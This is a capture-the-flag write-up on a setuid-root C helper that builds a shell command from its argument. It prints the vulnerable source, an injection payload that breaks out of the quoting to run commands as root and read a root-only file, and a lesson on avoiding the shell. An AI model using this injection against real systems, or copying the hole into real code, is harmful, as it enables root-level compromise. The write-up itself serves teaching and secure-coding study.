# Permission Slip

**Exploitation · Wave 7 · 140 pts**

A setuid-root helper on a maintenance host: "given a filename, it prints the
owner and the name." They shipped the source. The bug is in plain sight.

## The source

```c
int main(int argc, char **argv) {
    setuid(0); setgid(0);
    char cmd[1024];
    snprintf(cmd, sizeof cmd,
             "/usr/bin/stat -c 'owner=%U name=%n for request %s'", argv[1]);
    return system(cmd);
}
```

`argv[1]` is interpolated **inside a single-quoted shell string** and handed to
`system()` — which runs `/bin/sh -c`. And `setuid(0)` already dropped the euid
to root before the call. Shell command injection as root.

## Exploit

Connect over `nc`, present the EXP7 session token, get an `operator` shell in a
sandbox. The flag is `flag.txt` in the session dir (`root:root`, mode `0400`).

Break out of the single quote, run my own command, reopen it:

```
permission_slip "'; id; cat flag.txt; echo __END__ '"
```

Resulting root command:

```sh
/usr/bin/stat -c 'owner=%U name=%n for request '; id; cat flag.txt; echo __END__ ''
```

The first `'` ends stat's format arg (`stat: missing operand`, harmless noise);
everything after runs as root. `id` → `uid=0(root)`, then `cat flag.txt`.

## Flag

```
POCTF{REDACTED}
```

## Lesson

Never build a shell string from untrusted input. `execv("/usr/bin/stat",
{"stat","-c",fmt,path,NULL})` — no shell, no injection. And setuid programs
should drop privilege they don't need and sanitize `argv` before touching it.
